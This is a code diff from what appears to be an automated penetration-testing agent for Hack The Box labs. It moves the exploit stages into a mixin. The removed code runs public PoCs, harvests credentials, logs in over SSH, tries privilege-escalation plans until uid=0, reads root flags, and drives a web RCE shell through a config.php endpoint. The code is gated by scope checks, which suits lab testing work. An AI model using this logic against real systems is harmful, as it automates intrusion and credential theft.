@@ -37,6 +37,7 @@ from .creds_harvest import harvest as harvest_creds
 from .creds_harvest import is_safe_for_cmd
 from .flag import FlagHit
 from .flag import scan as scan_flags
+from .foothold import FootholdMixin
 from .hypotheses import HypothesisLedger, parse_id, strip_ledger_json
 from .knowledge import KnowledgeBase
 from .llm.router import LLMRouter
@@ -182,7 +183,7 @@ class OrchestrationReport:
         return report_view.render_glance(self)
 
 
-class Orchestrator:
+class Orchestrator(FootholdMixin):
     def __init__(self, guard: ScopeGuard, runner: Runner, kb: KnowledgeBase,
                  approver: Approver = auto_approve_in_scope,
                  hosts_map: dict[str, str] | None = None,
@@ -1663,120 +1664,10 @@ class Orchestrator:
                     f"골라 searchsploit -m <id> 로 받아 --exploit-exec --poc 로 실행(권한 확인 대상 전용):")
         report.manual_suggestions.append(head + "\n" + "\n".join(rows) + fetch)
 
-    def _exploit_run_stage(self, report, host):
-        """3단계: 주입된 공개 PoC(--poc)를 게이트로 실행 → 자격 캡처 → world 반영."""
-        if not self.exploit_exec or self.world is None or self.dry_run:
-            return
-        for poc in getattr(self, "poc_commands", []) or []:
-            if self._goal_reached(report) or self._time_up():
-                return
-            before = len(report.enum_findings)
-            self._attempt(report, report.enum_findings, poc, phase="access")
-            from .exploit_run import harvest_creds
-            for f in report.enum_findings[before:]:
-                for u, p in harvest_creds(f.output or ""):
-                    self.world.add_cred(f"{u}:{p}", source="PoC 출력")
-
-    def _exploit_exec_stage(self, report, host):
-        if not self.exploit_exec or self.world is None or self.dry_run:
-            return
-        from .target_shell import FLAG_READS, PRIVESC_ENUM, SSHTargetShell, parse_cred
-        creds = []
-        for c in self.world.creds:
-            pc = parse_cred(c)
-            if pc and pc not in creds:
-                creds.append(pc)
-        if not creds:
-            self.audit.event("exploit_exec_skip", reason="no_plaintext_cred")
-            return
-        if host is not None and host.open_ports and 22 not in host.open_ports:
-            self.audit.event("exploit_exec_skip", reason="ssh_closed")
-            return
-        if not self.is_tool_available("sshpass"):
-            self.audit.event("exploit_exec_skip", reason="sshpass_missing")
-            return
-        target = str(self.guard.bound_target or self.guard.bound_host)
-        for user, pw in creds[:3]:
-            sh = SSHTargetShell(target, user, pw)
-            for rc in [*FLAG_READS, *PRIVESC_ENUM]:
-                if self._goal_reached(report) or self._time_up():
-                    break
-                self._attempt(report, report.enum_findings, sh.command(rc), phase="privesc")
-            else:
-                continue
-            break
-        # 2단계 폐루프(읽기 되먹임): 발판에서 읽은 privesc 열거(sudo 규칙·SUID·커널)·플래그
-        # 출력을 다시 스캔해 새 크리덴셜·CVE·플래그를 월드/분석에 반영한다(다음 분석이 'GTFOBins
-        # 다음 수'를 제안하도록). 열거만 되먹임 — 자동 익스 실행이 아니다(생성 경계 유지).
-        self._run_vuln(report, host, target)
-        # ③ 폐루프 발사 (⚠️ 권한상승 실행 표면): 랭킹된 최상위 벡터의 상승 계획을 SSH 셸에서
-        # 실행하고 uid=0 확인 → world 권한레벨 전이 → root 플래그. --exploit-exec 전용.
-        if self.auto_poc and not self.world.has_access("root") and creds:
-            from .privesc_analyze import analyze_enum
-            corpus = "\n".join(f.output for f in report.enum_findings if f.output)
-            vectors = [v for v in analyze_enum(corpus) if v.confidence == "high" and v.plan]
-            user, pw = creds[0]
-            sh = SSHTargetShell(target, user, pw)
-            for v in vectors[:3]:
-                # v.plan 을 실행한 뒤 'id' 로 결과 확인 (한 줄로 묶어 실행)
-                self._attempt(report, report.enum_findings,
-                              sh.command(f"{v.plan.splitlines()[0]}; id"), phase="privesc")
-                last = report.enum_findings[-1].output or ""
-                if "uid=0(root)" in last:
-                    self.world.raise_access("root")
-                    self._attempt(report, report.enum_findings,
-                                  sh.command("cat /root/root.txt 2>/dev/null"), phase="privesc")
-                    break
-
-    def _foothold_stage(self, report, host) -> None:
-        """발판 세션 확보 → 자격수확 → 플래그 수집. --exploit-exec 전용(RCE 실행 표면)."""
-        if not self.exploit_exec or self.world is None or self.dry_run:
-            return
-        session = self._acquire_session(report, host)   # ← 발판 획득(아래 TODO)
-        if session is None or not session.alive:
-            return
-        from . import cred_sources, flag_read
-        # 자격 수확
-        for cmd in cred_sources.config_reads(self.world.web_product):
-            out = session.run(cmd)
-            for u, p, _label in cred_sources.parse_config_creds(out):
-                self.world.add_cred(f"{u}:{p}", source="설정파일")
-        # 플래그 수집(채널 무관) — [S4-2] 단일 경로로 report.flags 에도 반영한다. 과거엔
-        # world.add_flag '만' 불러 발판으로 읽은 플래그가 report.user/root_flag·goal_reached
-        # 에 안 잡혔다(상태원 분기). 발판 세션 직독이므로 provenance=exploit-derived.
-        # (발판 세션 획득·전송 로직은 불변 — 여기선 '이미 읽은' 플래그의 상태 반영만 바꾼다.)
-        for kind, val in flag_read.read_flags(session, flag_kind=self.flag_kind).items():
-            prov = _prov.FlagProvenance(kind, val, "<발판 세션 직독>", "foothold",
-                                        "exploit-derived", "발판 세션에서 직접 읽음")
-            self._record_flag(report, FlagHit(val, kind, "발판"), prov)
-
-    def _acquire_session(self, report, host):
-        """발판 세션 획득 + 성립 검증. --exploit-exec/--auto-poc 전용(RCE 실행 표면).
-        현재는 웹 RCE 분기만 활성 — 역쉘 수신 경로는 순서 4(실제 경로 확인) 후 재추가.
-        웹 RCE 채널 전송부(shell_transport)는 requests 에 의존(선택 설치) — 미설치면 전체
-        실행을 크래시내지 않고 '발판 미확보'로 안전하게 건너뛴다(정직한 degrade)."""
-        if self.world is None or not (self.world.web_product and self.auto_poc):
-            return None
-        from .session_verify import looks_like_shell, verify_probe_command
-        from .shell_session import WebRceSession
-        try:
-            from .shell_transport import web_http_fn  # requests 의존(선택)
-        except ImportError as e:
-            self.audit.event("foothold_skip", reason="requests_missing", detail=str(e))
-            report.manual_suggestions.append(
-                "# 웹 RCE 발판 채널 비활성 — requests 미설치. 활성화하려면 venv 에서 "
-                "`pip install requests`(또는 `pip install -e \".[exploit]\"`). 미설치 상태에선 "
-                "발판 미확보로 안전하게 건너뜀(실행 크래시 아님).")
-            return None
-        # (1) 웹 RCE 분기: cmd 엔드포인트에 명령 실행 → id/uname 신호로 성립 검증
-        # PoC 가 성립시킨 cmd 엔드포인트(없으면 기본 config.php) — ②에서 정교화
-        url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
-        ws = WebRceSession(url, "cmd", method="POST", inject="body")
-        ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
-        # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지)
-        if looks_like_shell(ws.run(verify_probe_command())):
-            return ws
-        return None
+    # [6a] 실행 스테이지(_exploit_run_stage·_exploit_exec_stage·_foothold_stage·
+    # _acquire_session)는 RCE/권한상승 '실행 표면'이라 foothold.FootholdMixin 으로 분리했다.
+    # Orchestrator 가 그 믹스인을 상속하므로 런타임 동작은 완전히 동일(발사 로직 불변·행위 보존).
+    # 상세: src/htb_agent/foothold.py 모듈 독스트링.
 
     # [S4-3] 준비 생성기 로직은 preparations 모듈의 자유 함수로 분리(god-object 축소).
     # 아래는 self 상태 → 명시 인자로 넘기는 얇은 위임 래퍼(행위 보존 — 생성 전용·실행 없음).
